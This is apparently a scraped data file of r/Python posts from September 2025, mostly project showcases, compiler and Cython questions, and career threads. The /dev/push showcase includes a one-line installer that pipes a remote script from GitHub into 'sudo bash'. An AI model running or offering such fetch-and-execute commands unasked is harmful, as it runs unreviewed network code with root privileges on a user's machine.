* FastDepends: It also cannot be used with non-serializable classes, and I wanted to inject machine learning models into services. On top of that, it does unpredictable things beyond dependency injection.

Repo: [https://github.com/entropy-flux/PyDepends](https://github.com/entropy-flux/PyDepends)

Hope you find it useful!

EDIT: Sorry to Lancetnik12 I think he did a great job with fastdepends and faststream, I was a to rude with his job, the reality is fastdepends just have other use cases, I don't really like to compare my job with other but it is a requirement to publish here. "
1ndhycj,AI-Rulez v2.0: Universal AI Assistant Configuration Management,Goldziher,0,0,2025-09-10 15:51:12,https://www.reddit.com/r/Python/comments/1ndhycj/airulez_v20_universal_ai_assistant_configuration/,"I'm happy to showcase AI-Rulez v2, which is a major next step in the development of this tool. 

**The Problem:** If you're using multiple AI coding assistants (Claude Code, Cursor, Windsurf, GitHub Copilot), you've probably noticed the configuration fragmentation. Each tool demands its own format - `CLAUDE.md`, `.cursorrules`, `.windsurfrules`, `.github/copilot-instructions.md`. Keeping coding standards consistent across all these tools is frustrating and error-prone.

**The Solution:** AI-Rulez lets you write your project configuration once and automatically generates native files for every AI tool - current and future ones. It's like having a build system for AI context.

## Why This Matters for Development Teams

Teams using AI assistants face common challenges:
- **Multiple tools, multiple configs**: Your team uses Claude Code for reviews, Cursor for development, Copilot for completions
- **Framework-specific standards**: Type safety, testing patterns, dependency management (uv, poetry, npm, etc.)  
- **Monorepo complexity**: Multiple services and packages all need different AI contexts
- **Team consistency**: Junior devs get different AI guidance than seniors

AI-Rulez solves this with a single `ai-rulez.yaml` that understands your project's conventions.

## Key Features

### AI-Powered Project Analysis
The `init` command is where AI-Rulez shines. Instead of manually writing configurations, let AI analyze your codebase:

```bash
# AI analyzes your codebase and generates tailored config
uvx ai-rulez init ""My Project"" --preset popular --use-agent claude --yes
```

This automatically:
- Detects your tech stack (Python/Node/Go, testing frameworks, linters)
- Identifies project patterns and conventions
- Generates appropriate coding standards and practices
- Creates specialized agents for different tasks (code review, testing, docs)
- **Automatically adds all generated AI files to .gitignore** - no more committing `.cursorrules` or `CLAUDE.md` by accident

### Universal Output Generation
One YAML config generates files for every tool:

```yaml
# ai-rulez.yaml
metadata:
  name: ""Python API Service""

presets:
  - ""popular""  # Auto-configures Claude, Cursor, Windsurf, Copilot

rules:
  - name: ""Python Type Safety""
    priority: critical
    content: |
      - Python 3.11+ with complete type annotations
      - Use | for unions: str | None not Optional[str]
      - mypy strict mode required
      - Type all function signatures and returns

  - name: ""Testing Standards""
    priority: high
    content: |
      - pytest with async support and fixtures
      - 100% coverage for new code
      - Use factory_boy for test data
      - Integration tests with real PostgreSQL

agents:
  - name: ""python-reviewer""
    description: ""Python code review specialist""
    system_prompt: ""Focus on type safety, performance, and Pythonic patterns""
```

Run `uvx ai-rulez generate` and get:
- `CLAUDE.md` for Claude Code
- `.cursorrules` for Cursor
- `.windsurfrules` for Windsurf  
- `.github/copilot-instructions.md` for GitHub Copilot
- Custom formats for any future AI tool

### Advanced Features

**MCP Server Integration**: Direct integration with Claude Code and other MCP-compatible tools:
```bash
# Start built-in MCP server with 19 configuration management tools
uvx ai-rulez mcp
```

**Comprehensive CLI**: Manage configs without editing YAML:
```bash
# Add Python-specific rules on the fly
uvx ai-rulez add rule ""FastAPI Standards"" --priority high --content ""Use Pydantic v2 models with Field validation""

# Create specialized agents
uvx ai-rulez add agent ""pytest-expert"" --description ""Testing specialist for Python projects""
```

**Team Collaboration**: 
- Remote config includes: `includes: [""https://github.com/myorg/python-standards.yaml""]`
- Local overrides: Personal customization via `.local.yaml` files
- Monorepo support: `--recursive` flag handles complex Python projects

### Enterprise Features

**Security & Compliance**:
- SSRF protection for remote config includes
- Schema validation prevents configuration errors
- Audit trails for configuration changes

**Performance**:
- Written in Go - instant startup even for large Python monorepos
- Concurrent generation for multiple output files
- Smart caching for remote configurations

## Target Audience

- **Python developers** using multiple AI coding assistants
- **Python teams** needing consistent AI behavior across projects  
- **DevOps engineers** managing AI configurations in CI/CD pipelines
- **Open source maintainers** wanting AI-ready Python project documentation
- **Enterprise teams** requiring centralized AI assistant management

## Comparison to Alternatives

### vs Manual Configuration Management
**Manual approach**: Maintain separate `.cursorrules`, `CLAUDE.md`, `.windsurfrules` files
- Problem: Configuration drift, inconsistent standards, manual syncing
- **AI-Rulez solution**: Single source generates all formats automatically

### vs Basic Tools (airules, template-ai)
**Basic tools**: Simple file copying or template systems
- **AI-Rulez advantages**: 
  - AI-powered codebase analysis and config generation
  - MCP protocol integration for live configuration management
  - Full CRUD CLI for configuration management
  - Enterprise security features and team collaboration

### vs Tool-Specific Solutions
**Tool-specific**: Each AI assistant has its own configuration system
- **AI-Rulez advantages**:
  - Future-proof: works with new AI tools without reconfiguration
  - Repository-level management for complex Python projects
  - Consistent behavior across your entire AI toolchain

## Installation & Usage

```bash
# Install via pip
pip install ai-rulez

# Or run without installing
uvx ai-rulez init ""My Python Project"" --preset popular --yes

# Generate configuration files
ai-rulez generate

# Add to your pre-commit hooks
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/Goldziher/ai-rulez
    rev: v2.1.3
    hooks:
      - id: ai-rulez-validate
      - id: ai-rulez-generate
```

## Real-World Example

Here's how a Django + React monorepo benefits from AI-Rulez:

```yaml
# ai-rulez.yaml
extends: ""https://github.com/myorg/python-base.yaml""

sections:
  - name: ""Architecture""
    content: |
      - Django REST API backend with PostgreSQL
      - React TypeScript frontend
      - Celery for async tasks
      - Docker containerization

agents:
  - name: ""django-expert""
    system_prompt: ""Django specialist focusing on DRF, ORM optimization, and security""
  
  - name: ""frontend-reviewer""  
    system_prompt: ""React/TypeScript expert for component architecture and testing""

mcp_servers:
  - name: ""database-tools""
    command: ""uvx""
    args: [""mcp-server-postgres""]
    env:
      DATABASE_URL: ""postgresql://localhost/myproject""
```

This generates tailored configurations for each AI tool, ensuring consistent guidance whether you're working on Django models or React components.

## Documentation & Resources

- **Full Documentation**: [https://goldziher.github.io/ai-rulez/](https://goldziher.github.io/ai-rulez/)
- **GitHub Repository**: [https://github.com/Goldziher/ai-rulez](https://github.com/Goldziher/ai-rulez)
- **Quick Start Guide**: [https://goldziher.github.io/ai-rulez/quick-start/](https://goldziher.github.io/ai-rulez/quick-start/)

---

AI-Rulez has evolved significantly since v1.0, adding AI-powered initialization, comprehensive MCP integration, and enterprise-grade features. It's being used by teams managing large Python codebases who need consistent AI assistant behavior across their entire development workflow.

I've personally seen this solve major headaches in production Python projects where different team members were getting inconsistent AI guidance. The `init` command with AI analysis is particularly powerful for getting started quickly.

**If this sounds useful for your Python projects, please check out the [GitHub repository](https://github.com/Goldziher/ai-rulez) and consider giving it a star - it helps with visibility and keeps development motivation high!**

Would love to hear about your use cases and any feedback from the Python community."
1nd72p7,Wondering how many of you have successfully developed and monetized an API,dooditydoot,0,7,2025-09-10 06:46:41,https://www.reddit.com/r/Python/comments/1nd72p7/wondering_how_many_of_you_have_successfully/,"Hey everyone! I‚Äôm interested and curious to know from your experiences in developing and monetizing APIs.

What niche did you choose?
What are your distribution channels?
Your top challenges?

TIA!"
1nd1go9,I created a pretty-printed dir function to make debugging complex classes easier,hammyhami,33,3,2025-09-10 01:41:36,https://www.reddit.com/r/Python/comments/1nd1go9/i_created_a_prettyprinted_dir_function_to_make/,"**What My Project Does**

You can check it out on github:¬†[https://pypi.org/project/pretty-dir/](https://pypi.org/project/pretty-dir/)

This library generates a better **dir** output for debugging. For a quick example, check out the [with dir](https://github.com/douglassimonsen/ppdir/raw/main/example_images/before.png) and [with ppdir](https://github.com/douglassimonsen/ppdir/raw/main/example_images/after.png) outputs using a simple pydantic model.

  
**Target Audience**

This is mainly aimed at developers who are debugging code that uses any libraries that have large, complex, deeply nested classes. Libraries such as pydantic, dataclasses, and openpyxl.

**Comparison**

It exists in a similar niche as icecream and rich.inspect where it's meant to improve the debugging experience. Unlike similar libraries, this only shows the structure, not the values themselves. This is valuable in pydantic environments, where instances can be too verbose to be meaningful when printed to the console.

**Details**

The library uses the output of the **dir(obj)** function as a baseline, but improves the output in a number of ways:

* Visually groups the methods and attributes by the classes they were defined on. Therefore, if you're subclassing the [pydantic.BaseModel](https://docs.pydantic.dev/latest/api/base_model/) class, it separates the generic basemodel methods from the subclass' specific methods.
* Pulls the first line of the docstrings for the class, all methods, and all class attributes.
* Can enable showing the function signature for all class methods
* By default, hides private and and dunder methods from the outputs
* Prints the source code location of all parent classes
* Uses [colorama](https://pypi.org/project/colorama/) to color the different sections of the output

I've set it to automatically import (see **Auto-loading in PDB (Breakpoint)** on PyPI) when I use breakpoint() and it's been a nice quality of life improvement!

This is my first project I expect other people to use, so let me know if I can improve anything!"
1ncy8av,Most Performant Python Compilers/Transpilers in 2025,wbcm,30,35,2025-09-09 23:13:04,https://www.reddit.com/r/Python/comments/1ncy8av/most_performant_python_compilerstranspilers_in/,"Today I find myself in the unfortunate position to create a program that must compile arbitrary python code :(  For the use case I am facing now performance is everything, and luckily the target OS for the executable file will only be linux. The compiled codes will be standalone local computational tools without any frills (no guis, no i|o or r|w operations, no system access, and no backend or configuration needs to pull in). Python code is >=3.8 and can pull in external libraries (eg: numpy). However, the codes may be multithreaded/multiprocessed and any static type-like behavior is not guaranteed.

Historically I have used tools like pyinstaller, py2exe, py2app, which work robustly, but create stand alone executable files that are often pretty slow. I have been looking at a host of transpilers instead, eg: [https://github.com/dbohdan/compilers-targeting-c?tab=readme-ov-file](https://github.com/dbohdan/compilers-targeting-c?tab=readme-ov-file), and am somewhat overwhelmed by the amount of choices therein. Going through stackoverflow naturally recovered a lot of great recommendations that were go-to's 10-20 years ago, but do not have much promise for recent python versions. Currently I am considering:  
wax [https://github.com/LingDong-/wax](https://github.com/LingDong-/wax) ,  
11l-lang [https://11l-lang.org/transpiler/](https://11l-lang.org/transpiler/),  
nuitka [https://nuitka.net/](https://nuitka.net/),  
prometeo  [https://github.com/zanellia/prometeo](https://github.com/zanellia/prometeo),  
pytran [https://pythran.readthedocs.io/en/latest/](https://pythran.readthedocs.io/en/latest/),  
rpython [https://rpython.readthedocs.io/en/latest/](https://rpython.readthedocs.io/en/latest/),  
or py14  https://github.com/lukasmartinelli/py14.  
However, this is a lot to consider without rigorously testing all of them out. Does anyone on this sub have experience in modern Transpilers or other techniques for compiling numerical python codes for linux? If so, can you share any tools, techniques, or general guidance? Thank you!

Edit for clarification:  
This will be placed in a user facing application wherein users can upload their tools to be autonomously deployed in a on demand/dynamic runtime basis. Since we cannot know all the codes that users are uploading, a lot of the traditional and well defined methods are not possible. We are including C, C++, Rust, Fortran, Go, and Cobol compilers to support these languages, but seeking a similar solution for python."
1ncxl3i,Method overloading: in ~30 lines of code. Simple enough?,szymoffk,3,7,2025-09-09 22:46:09,https://www.reddit.com/r/Python/comments/1ncxl3i/method_overloading_in_30_lines_of_code_simple/,"Getting into the deeper parts of Python and thought of this simple Metaclass that allows method overloading.

    from typing import get_type_hints
    
    class OverloadingDict(dict):
    ¬† ¬† def __setitem__(self, key, value):
    ¬† ¬† ¬† ¬† if callable(value) and key in self:
    ¬† ¬† ¬† ¬† ¬† ¬† old_func = super().__getitem__(key)
    ¬† ¬† ¬† ¬† ¬† ¬† if not isinstance(old_func, Overloader):
    ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† Overloader(old_func)
    ¬† ¬† ¬† ¬† ¬† ¬† value = Overloader(value)
    
    ¬† ¬† ¬† ¬† super().__setitem__(key, value)
    
    class AllowOverload(type):
    ¬† ¬† def __prepare__(*args):
    ¬† ¬† ¬† ¬† return OverloadingDict()
    
    class Overloader:
    ¬† ¬† registry = {}
    
    ¬† ¬† def __new__(cls, func):
    ¬† ¬† ¬† ¬† hint = get_type_hints(func)
    
    ¬† ¬† ¬† ¬† # Hack to get first (and only) hint...
    ¬† ¬† ¬† ¬† for hint in get_type_hints(func).values():
    ¬† ¬† ¬† ¬† ¬† ¬† break
    ¬† ¬† ¬† ¬† 
    ¬† ¬† ¬† ¬† cls.registry[hint] = func
    ¬† ¬† ¬† ¬† return super().__new__(cls)
    ¬† ¬† 
    ¬† ¬† def __call__(self, arg):
    ¬† ¬† ¬† ¬† arg_type = type(arg)
    ¬† ¬† ¬† ¬† func = self.registry[arg_type]
    ¬† ¬† ¬† ¬† return func(self, arg)
    ¬† ¬† ¬† ¬† 
    
    class Dog(metaclass=AllowOverload):
    ¬† ¬† def bark(self, n: int):
    ¬† ¬† ¬† ¬† print(""Bark! "" * n)
    
    ¬† ¬† def bark(self, at: str):
    ¬† ¬† ¬† ¬† print(""Barking at "" + at)
    
    doge = Dog()
    
    doge.bark(2)
    doge.bark(""cat"")

    Output:
    Bark! Bark!
    Barking at cat

It obviously is only a proof of concept.  
I didn't have the patience for many args/kwargs matching. Overloader could also be quasi-sentinel (one instance per class) and work for many classes. But you get the idea.

I think fully working overloading metaclass could be done in 100-200 lines of code.  
Do you think method overloading metaclass should be added to stdlib?"
1ncnz58,"Need ideas for hackathon project, Real-time collaborative coding SaaS",Goal-based76,0,3,2025-09-09 16:42:12,https://www.reddit.com/r/Python/comments/1ncnz58/need_ideas_for_hackathon_project_realtime/,"Our team picked ‚ÄúReal-Time Collaborative Coding SaaS‚Äù as the problem statement for an upcoming hackathon. Basically, it‚Äôs like Google Docs but for coding,  multiple devs working on the same project with live debugging and version control.

I know there are already tools like VS Code Live Share and more, but since this is the given challenge, we are looking for innovative ideas to make it stand out.

Any feature suggestions, unique use cases, or crazy ideas are welcome. Thanks!"
1ncn5fq,imgbatch ‚Äì A Python tool for batch-processing images from the command line,BrightSheepherder323,7,2,2025-09-09 16:11:00,https://www.reddit.com/r/Python/comments/1ncn5fq/imgbatch_a_python_tool_for_batchprocessing_images/,"**What My Project Does**

[https://github.com/booo2233/imgbatch](https://github.com/booo2233/imgbatch)

 is a simple Python tool that lets you batch-process images (resize, compress, or convert formats) directly from the command line. Instead of opening heavy software, you can point it at a folder and quickly process all your images in one go.

**Target Audience**  
This is mainly aimed at:

* Developers who need quick image preprocessing for projects
* Photographers or designers who want to resize/compress many images at once
* Anyone who prefers lightweight CLI tools instead of GUIs

It‚Äôs not production-grade yet, but it‚Äôs stable enough for everyday use and easy to extend.

**Comparison**  
Compared to tools like ImageMagick or Pillow scripts:

* imgbatch is **simpler** (minimal commands, no need to learn a big toolset)
* It‚Äôs **focused only on batch tasks** (not a general-purpose graphics library)
* Written in Python, so easy to tweak or add custom functions if you know a little code

üëâ Repo: [https://github.com/booo2233/imgbatch](https://github.com/booo2233/imgbatch)

Would love feedback, and if you find it useful, a ‚≠ê would be amazing!  
thank you guys"
1ncmlwv,Should I give away my app to my employer for free?,RDE_20,447,277,2025-09-09 15:50:58,https://www.reddit.com/r/Python/comments/1ncmlwv/should_i_give_away_my_app_to_my_employer_for_free/,"I work for a fintech company in the UK (in operations to be specific) however my daily role doesn‚Äôt require any coding knowledge. I have built up some python knowledge over the past few years and have developed an app that far outperforms the workflow tool my company currently uses. I have given hints to my manager that I have some coding knowledge and given them snippets of the tool I‚Äôve created, she‚Äôs pretty much given me free reign to stop any of my usual tasks and focus on this full time. My partner used to work for the same company in the finance department so I know they paid over ¬£200k for 3 people to develop the current workflow tool (these developers had no operations experience so built something unfit for purpose). I‚Äôve estimated if I can get my app functional it would save the company ¬£20k per month (due to all the manual work we usually have to do vs what I can automate). My manager has already said this puts me in a good position for a decent bonus next year (it wouldn‚Äôt be anymore than ¬£10k) so I‚Äôm a little stuck on what to do and if I‚Äôm sounding greedy. 

Has anyone ever been in a similar position? 

EDIT TITLE: I know it‚Äôs not ‚Äòfor free‚Äô as of course I‚Äôm paid to do my job. But I would be handing over hours of work that I haven‚Äôt been paid for. "
1nckydw,Cythonize Python Code,yousefabuz,24,30,2025-09-09 14:48:10,https://www.reddit.com/r/Python/comments/1nckydw/cythonize_python_code/,"# Context

This is my first time messing with **Cython** (or really anything related to optimizing Python code).  
I usually just stick with yielding and avoiding keeping much in memory, so bear with me.

# Context

I‚Äôm building a Python project that‚Äôs kind of like `zipgrep` / `ugrep`.  
It streams through archive(s) file contents (nothing kept in memory) and searches for whatever pattern is passed in.

# Benchmarks

(Results vary depending on the pattern, hence the wide gap)

* ‚úÖ **\~15‚Äì30x faster** than `zipgrep` (expected)
* ‚ùå **\~2‚Äì8x slower** than `ugrep` (also expected, since it‚Äôs C++ and much faster)

I tried:

* `cythonize` from [`Cython.Build`](http://Cython.Build) with setuptools
* Nuitka

But the performance was basically identical in both cases. I didn‚Äôt see any difference at all.  
Maybe I compiled Cython/Nuitka incorrectly, even though they both built successfully?

# Question

Is it actually worth:

* Manually writing `.c` files
* Switching the right parts over to `cdef`

Or is this just one of those cases where Python‚Äôs overhead will always keep it behind something like `ugrep`?

Gitub Repo: [pyzipgrep](https://github.com/yousefabuz17/pyzipgrep)"
1nchgtb,Absolute Cinema (or.. programming language in this case),Dry_Structure8990,0,2,2025-09-09 12:25:04,https://www.reddit.com/r/Python/comments/1nchgtb/absolute_cinema_or_programming_language_in_this/,"Had to knowledge python (thanks filters) In class, quickly got bored of it.

Get home, try to make calculator with it.

this is fucking sick."
1ncgwas,[Project] /dev/push - An open source Vercel for Python apps,hunvreus,6,0,2025-09-09 11:58:36,https://www.reddit.com/r/Python/comments/1ncgwas/project_devpush_an_open_source_vercel_for_python/,"**What My Project Does**

[/dev/push](https://github.com/hunvreus/devpush) is an open source deployment platform that lets you deploy Python apps with a UX similar to Vercel/Render. It handles git-based deployments, environment variables, real-time logs, custom domains...

**Target Audience**

Python developers who want an easier way to self-host and deploy apps. It‚Äôs ready for use (I run it for my own apps) but still in beta. Bug reports and feedback is welcome.

**Comparison**

Unlike Vercel or Render, /dev/push is fully open source and self-hosted. You can install and run it on your own Debian/Ubuntu server with a single command, without relying on a third-party platform. Compared to Coolify or CapRover, it‚Äôs lighter and more focused on delivering a polished UX.

**How to get started**

You can install it on a any Debian/Ubuntu server with a single command:

    curl -fsSL https://raw.githubusercontent.com/hunvreus/devpush/main/scripts/prod/install.sh | sudo bash

More info on installation steps: [https://devpu.sh/docs/installation/#quickstart](https://devpu.sh/docs/installation/#quickstart)

**Links**

* GitHub: [https://github.com/hunvreus/devpush](https://github.com/hunvreus/devpush)
* Docs: [https://devpu.sh/docs](https://devpu.sh/docs)
* Website: [https://devpu.sh](https://devpu.sh)"
1ncbh1t,I built a Django job scraper that saves listings directly into Google Sheets,Funny-Ad-5060,0,6,2025-09-09 06:23:21,https://www.reddit.com/r/Python/comments/1ncbh1t/i_built_a_django_job_scraper_that_saves_listings/,"Hey everyone

I was spending way too much time manually checking job boards, copying jobs into spreadsheets, and still missing good opportunities. So I built a small Django project to automate the whole process.

Here‚Äôs what it does:

* ‚úÖ Scrapes job listings from TimesJobs using **BeautifulSoup + Requests**
* ‚úÖ Saves them in a **Django SQLite database**
* ‚úÖ Pushes jobs into **Google Sheets** via API
* ‚úÖ Avoids duplicates and formats data cleanly
* ‚úÖ Runs automatically every few hours with Python‚Äôs `schedule` library

**Source code (GitHub):** [jobscraper](https://github.com/coderdigi01/jobscraper)  
**Full step-by-step tutorial (with code snippets):** [Blog Post]()

This was a fun project that taught me a lot about:

* Rate limiting (got blocked early on for too many requests)
* Handling inconsistent HTML in job listings
* Google Sheets API quotas and batching updates"
1ncaaqa,trying to find old rtmidi module,000wall,3,9,2025-09-09 05:10:51,https://www.reddit.com/r/Python/comments/1ncaaqa/trying_to_find_old_rtmidi_module/,"I am trying to get MIDI input working in a very old Python 2.7 game, which is based on pygame 1.9.6.  
This game requires ""rtmidi"", but I've been unable to find exactly which rtmidi it needs.

These are the API calls used by the game;

    import rtmidi
    .RtMidiOut()
    .RtMidiIn()
    .getPortCount()
    .openPort()
    .getMessage()

which rules out `rtmidi-python` and `python-rtmidi` as those use `.MidiOut`/`.MidiIn` instead of `.RtMidiOut`/`.RtMidiIn`.

I also tried every version of `rtmidi` which uses the API expected by this game, but the game crashes on startup with the error `TypeError: object of type 'NoneType' has no len()`."
1nc7tpm,What is the best framework for working with data from remote devices and applying it to the web?,TankBorn,4,2,2025-09-09 02:58:08,https://www.reddit.com/r/Python/comments/1nc7tpm/what_is_the_best_framework_for_working_with_data/,"I need to get data from IoT devices and work with them, being able to manipulate them on the web and in databases.

I was thinking about Django Rest - Framework‚Ä¶."
1nc7r45,Python Type System and Tooling Survey 2025,AlSweigart,81,14,2025-09-09 02:54:32,https://www.reddit.com/r/Python/comments/1nc7r45/python_type_system_and_tooling_survey_2025/,"This survey was developed with support from the Pyrefly team at Meta, the PyCharm team at JetBrains, and the typing community on discourse.python.org. No typing experience needed -- your perspective as a Python dev matters most. Take a couple minutes to help improve Python typing for all:

https://docs.google.com/forms/d/e/1FAIpQLSeOFkLutxMLqsU6GPe60OJFYVN699vqjXPtuvUoxbz108eDWQ/viewform?fbzx=-4095906651778441520"
1nc41wf,Tuesday Daily Thread: Advanced questions,AutoModerator,5,0,2025-09-09 00:00:29,https://www.reddit.com/r/Python/comments/1nc41wf/tuesday_daily_thread_advanced_questions/,"# Weekly Wednesday Thread: Advanced Questions üêç

Dive deep into Python with our Advanced Questions thread! This space is reserved for questions about more advanced Python topics, frameworks, and best practices.

## How it Works:

1. **Ask Away**: Post your advanced Python questions here.
2. **Expert Insights**: Get answers from experienced developers.
3. **Resource Pool**: Share or discover tutorials, articles, and tips.

## Guidelines:

* This thread is for **advanced questions only**. Beginner questions are welcome in our [Daily Beginner Thread](#daily-beginner-thread-link) every Thursday.
* Questions that are not advanced may be removed and redirected to the appropriate thread.

## Recommended Resources:

* If you don't receive a response, consider exploring r/LearnPython or join the [Python Discord Server](https://discord.gg/python) for quicker assistance.

## Example Questions:

1. **How can you implement a custom memory allocator in Python?**
2. **What are the best practices for optimizing Cython code for heavy numerical computations?**
3. **How do you set up a multi-threaded architecture using Python's Global Interpreter Lock (GIL)?**
4. **Can you explain the intricacies of metaclasses and how they influence object-oriented design in Python?**
5. **How would you go about implementing a distributed task queue using Celery and RabbitMQ?**
6. **What are some advanced use-cases for Python's decorators?**
7. **How can you achieve real-time data streaming in Python with WebSockets?**
8. **What are the performance implications of using native Python data structures vs NumPy arrays for large-scale data?**
9. **Best practices for securing a Flask (or similar) REST API with OAuth 2.0?**
10. **What are the best practices for using Python in a microservices architecture? (..and more generally, should I even use microservices?)**

Let's deepen our Python knowledge together. Happy coding! üåü"
1nc3glf,"Just LSPDock v0.1.3 (before named LSProxy) released, multi-lsp handling feature",RichardHapb,1,0,2025-09-08 23:34:36,https://www.reddit.com/r/Python/comments/1nc3glf/just_lspdock_v013_before_named_lsproxy_released/,"I have news: I implemented the feature in the proxy for handling multiple LSP in the same path/project using an `--exec` argument. The details are in the README.

LSPDock allows you to connect to an LSP running inside a Docker container directly from the IDE and automatically handles the differences in paths.

Note: I renamed the project because a conflict with another project.

The link of the repo:

[https://github.com/richardhapb/lspdock](https://github.com/richardhapb/lspdock)"
1nc0etx,"Baba is you, learning games",Imaginary-Medium7360,9,7,2025-09-08 21:27:02,https://www.reddit.com/r/Python/comments/1nc0etx/baba_is_you_learning_games/,"Anyone played it? I heard it‚Äôs based on the logic of python. üêç 
Was thinking of downloading to keep me thinking about the topic while I am in the process of learning

https://youtu.be/z3_yA4HTJfs?si=OR6gXX6xCTiarFbM

Doesn‚Äôt apply to anything in my current job field but I am learning it to eventually make a lateral job move until the opportunity presents itself

It‚Äôs available on mobile so thinking of getting it"
1nbx7l6,cython for coding a game engine?,DeWildAsh,15,23,2025-09-08 19:24:22,https://www.reddit.com/r/Python/comments/1nbx7l6/cython_for_coding_a_game_engine/,"So I have plans to write a game engine, I wanna incorporate python as the main scripting language, and write the backend in C (maybe eventually c++) could I write the whole engine in cython getting the power of c but writing it in python or just stick to writing the backend in C?    "
1nbugq8,Error en Visual Studio Code: Terminal lenta y problema con la base de datos al usar Flask y GitHub.,Mysterious_Crow_7827,0,2,2025-09-08 17:42:55,https://www.reddit.com/r/Python/comments/1nbugq8/error_en_visual_studio_code_terminal_lenta_y/,"Hola a todos,

Necesito su ayuda con un problema que estoy teniendo con mi proyecto de Python/Flask en Visual Studio Code. He intentado varias cosas, pero no he logrado resolverlo.

Antecedentes del problema

Anteriormente, utilizaba GitHub Desktop para gestionar mis repositorios. De repente, me empez√≥ a dar un error que dec√≠a que no pod√≠a encontrar el repositorio local, a pesar de que los archivos segu√≠an en mi computadora.

Mi soluci√≥n temporal fue clonar de nuevo el repositorio, y eso funcion√≥ para GitHub Desktop. Sin embargo, ahora tengo un problema en Visual Studio Code que no s√© c√≥mo solucionar.

El problema actual

Terminal excesivamente lenta: Cuando uso la terminal de Visual Studio Code para ejecutar comandos como flask db init o flask run, el proceso se vuelve muy lento. Aunque eventualmente me muestra que el proceso fue exitoso, el tiempo de espera es anormal.

No se visualiza la base de datos: A pesar de que la terminal indica que el comando flask db init se ejecut√≥ correctamente, no puedo ver la base de datos (generalmente un archivo .db) en el explorador de archivos de Visual Studio Code. Es como si el archivo no se estuviera creando o se estuviera creando en un lugar incorrecto, aunque no me lanza ning√∫n error.

Lo que he revisado

Revis√© que mi entorno virtual (venv) est√© activado correctamente.

Confirm√© que los archivos del proyecto, como app.py y config.py, est√°n bien configurados para la base de datos.

Verifiqu√© que el archivo del repositorio est√° en el mismo lugar de siempre en mi computadora.

Mis preguntas

¬øPodr√≠a este problema estar relacionado con la forma en que GitHub Desktop maneja los repositorios?

¬øHay alguna configuraci√≥n espec√≠fica en Visual Studio Code que deba revisar?

¬øC√≥mo puedo solucionar la lentitud de la terminal y asegurar que la base de datos se cree y se muestre en mi explorador de archivos?

Agradezco de antemano cualquier sugerencia o ayuda que puedan darme. "
1nbtpoo,"Which 1 language to master for Al & Web in 2025?""",suraj_chandola,0,10,2025-09-08 17:15:45,https://www.reddit.com/r/Python/comments/1nbtpoo/which_1_language_to_master_for_al_web_in_2025/,"If you had to choose only one programming language to master for Al and web development in 2025, which one would it be and why?"
1nbnqh7,Questions for interview on OOPs concept.,DataScience123888,0,7,2025-09-08 13:27:40,https://www.reddit.com/r/Python/comments/1nbnqh7/questions_for_interview_on_oops_concept/,"I have python interview scheduled this week.

OOPs concept will be asked in depth, What questions can be asked or expected from OOPs concept in python given that there will be in depth grilling on OOPs.

Need this job badly already in huge debt."
1nbmdj7,Aicontextator - A CLI tool to safely bundle your project's code for LLMs,ILDaviz,0,0,2025-09-08 12:27:56,https://www.reddit.com/r/Python/comments/1nbmdj7/aicontextator_a_cli_tool_to_safely_bundle_your/,"

Hi,

I'm David. I built Aicontextator to scratch my own itch. I was spending way too much time manually gathering and pasting code files into LLM web UIs. It was tedious, and I was constantly worried about accidentally pasting an API key or another secret.

Aicontextator is a simple CLI tool built with Python that automates this entire process. You run it in your project directory, and it bundles all the relevant files into a single, clean string ready for your prompt.

The GitHub repo is here: [https://github.com/ILDaviz/aicontextator](https://github.com/ILDaviz/aicontextator)

I'd love to get your feedback and suggestions!

**What My Project Does**

Aicontextator is a command-line utility designed to make it easier and safer to provide code context to Large Language Models. Its main features are:

* **Context Bundling:** It recursively finds all files in your project, respects your `.gitignore` rules, and concatenates them into a single string for easy copy-pasting.
* **Security First:** It uses the `detect-secrets` engine to scan every file *before* adding it to the context. If it finds a potential secret (like an API key or password), it warns you and excludes that line, preventing accidental leaks.
* **User-Friendly Features:** It includes an interactive mode to visually select which files to include, a token counter to stay within the LLM's context limit, and the ability to automatically split the output into multiple chunks if the context is too large.

**Target Audience**

This tool is for any developer who regularly uses LLMs (like ChatGPT, Claude, Gemini, etc.) for coding assistance, debugging, or documentation. It's particularly useful for those working on projects with a non-trivial number of files (e.g., web developers, data scientists, backend engineers) where manually providing context is impractical. It's designed as a practical utility to be integrated into a daily development workflow, not just a toy project.

**Comparison with Alternatives**

* **vs. Manual Copy-Pasting:** This is the most common method, but it's slow, error-prone (it's easy to miss a file), and risky (you might accidentally paste a file like `.env`). Aicontextator automates this, making it fast, comprehensive, and safe.
* **vs. IDE Extensions (e.g., GitHub Copilot Chat, Cursor):** These tools are powerful but tie you to a specific editor and often a specific LLM ecosystem. Aicontextator is **editor-agnostic** and **LLM-agnostic**. It generates a simple string that you can use in any web UI or API you prefer, giving you complete flexibility.
* **vs. Other Context-Aware CLI Tools:** Many alternative tools try to be full-fledged chat clients in your terminal. Aicontextator has a much simpler scope: it does one thing and does it well. It focuses solely on **preparing the context**, acting as a powerful pre-processor for any LLM interaction, without forcing you into a specific chat interface.

Cheers!"
1nblyt6,Webscraping twitter or any,Ok-Raspberry-5333,21,12,2025-09-08 12:08:58,https://www.reddit.com/r/Python/comments/1nblyt6/webscraping_twitter_or_any/,So I was trying to learn webscraping. I was following a github repo project based learning. The methods were outdated so the libraries were. It was snscrape. I found the twitter's own mining api but after one try it was not working . It had rate limit. I searched for few and found playwright and selenium . I only want to learn how to get the data and convert it into datasets. Later I will continue doing analysis on them for learning purpose. Can anyone suggest me something that should follow ?
1nbkych,Stop building UI frameworks in Python,PastPicture,921,341,2025-09-08 11:17:22,https://www.reddit.com/r/Python/comments/1nbkych/stop_building_ui_frameworks_in_python/,"7 years back when I started coding, I used Tkinter. Then PyQt. 

I spent some good 2 weeks debating if I should learn Kivy or Java for building an Android app.

Then we've got modern ones: FastUI by Pydantic, NiceGUI (amazing project, it's the closest bet).

Python is great for a lot of things. Just stop abusing it by building (or trying to) UI with it. 

Even if you ship something you'll wake up in mid of night thinking of all the weird scenarios, convincing yourself to go back to sleep since you'll find a workaround like last time. 

Why I am saying this: Because I've tried it all. I've tried every possible way to avoid JavaScript and keep building UIs with Python.

I've contributed to some really popular UI libraries in Python, tried inventing one back in Tkinter days. 

I finally caved in and I now build UI with JavaScript, and I'm happier person now. I feel more human."
